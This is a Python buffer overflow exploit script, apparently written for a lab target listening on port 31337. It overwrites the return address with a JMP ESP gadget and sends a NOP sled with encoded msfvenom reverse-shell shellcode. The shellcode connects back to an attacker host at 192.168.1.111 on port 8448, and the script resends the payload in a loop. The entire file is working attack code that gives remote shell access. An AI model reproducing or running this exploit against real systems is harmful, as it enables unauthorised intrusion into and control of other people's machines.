import socket
import sys
import struct

# how to execute:
# python overflow.py 192.168.1.109 31337

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 146)

# JMP ESP (!mona jmp -r esp -b "\x00\x0a")
eip = 0x080414C3
eip = struct.pack("<I", eip)  # convert address to little endian format

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8448 -f c -a x86 --platform windows -b "\x00\x0a" -e x86/shikata_ga_nai
payload = ("\xbb\xcc\x88\xc7\xa0\xda\xcf\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
           "\x52\x31\x58\x12\x83\xc0\x04\x03\x94\x86\x25\x55\xd8\x7f\x2b"
           "\x96\x20\x80\x4c\x1e\xc5\xb1\x4c\x44\x8e\xe2\x7c\x0e\xc2\x0e"
           "\xf6\x42\xf6\x85\x7a\x4b\xf9\x2e\x30\xad\x34\xae\x69\x8d\x57"
           "\x2c\x70\xc2\xb7\x0d\xbb\x17\xb6\x4a\xa6\xda\xea\x03\xac\x49"
           "\x1a\x27\xf8\x51\x91\x7b\xec\xd1\x46\xcb\x0f\xf3\xd9\x47\x56"
           "\xd3\xd8\x84\xe2\x5a\xc2\xc9\xcf\x15\x79\x39\xbb\xa7\xab\x73"
           "\x44\x0b\x92\xbb\xb7\x55\xd3\x7c\x28\x20\x2d\x7f\xd5\x33\xea"
           "\xfd\x01\xb1\xe8\xa6\xc2\x61\xd4\x57\x06\xf7\x9f\x54\xe3\x73"
           "\xc7\x78\xf2\x50\x7c\x84\x7f\x57\x52\x0c\x3b\x7c\x76\x54\x9f"
           "\x1d\x2f\x30\x4e\x21\x2f\x9b\x2f\x87\x24\x36\x3b\xba\x67\x5f"
           "\x88\xf7\x97\x9f\x86\x80\xe4\xad\x09\x3b\x62\x9e\xc2\xe5\x75"
           "\xe1\xf8\x52\xe9\x1c\x03\xa3\x20\xdb\x57\xf3\x5a\xca\xd7\x98"
           "\x9a\xf3\x0d\x0e\xca\x5b\xfe\xef\xba\x1b\xae\x87\xd0\x93\x91"
           "\xb8\xdb\x79\xba\x53\x26\xea\x05\x0b\x29\x85\xed\x4e\x29\x78"
           "\xee\xc7\xcf\x10\xfe\x81\x58\x8d\x67\x88\x12\x2c\x67\x06\x5f"
           "\x6e\xe3\xa5\xa0\x21\x04\xc3\xb2\xd6\xe4\x9e\xe8\x71\xfa\x34"
           "\x84\x1e\x69\xd3\x54\x68\x92\x4c\x03\x3d\x64\x85\xc1\xd3\xdf"
           "\x3f\xf7\x29\xb9\x78\xb3\xf5\x7a\x86\x3a\x7b\xc6\xac\x2c\x45"
           "\xc7\xe8\x18\x19\x9e\xa6\xf6\xdf\x48\x09\xa0\x89\x27\xc3\x24"
           "\x4f\x04\xd4\x32\x50\x41\xa2\xda\xe1\x3c\xf3\xe5\xce\xa8\xf3"
           "\x9e\x32\x49\xfb\x75\xf7\x79\xb6\xd7\x5e\x12\x1f\x82\xe2\x7f"
           "\xa0\x79\x20\x86\x23\x8b\xd9\x7d\x3b\xfe\xdc\x3a\xfb\x13\xad"
           "\x53\x6e\x13\x02\x53\xbb")


exploit = junk + eip + ("\x90" * 16) + payload

# sending exploit
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print("Sending exploit...")
        s.send(exploit + "\n")
        s.recv(1024)
        s.close()
    except:
        sys.exit(0)
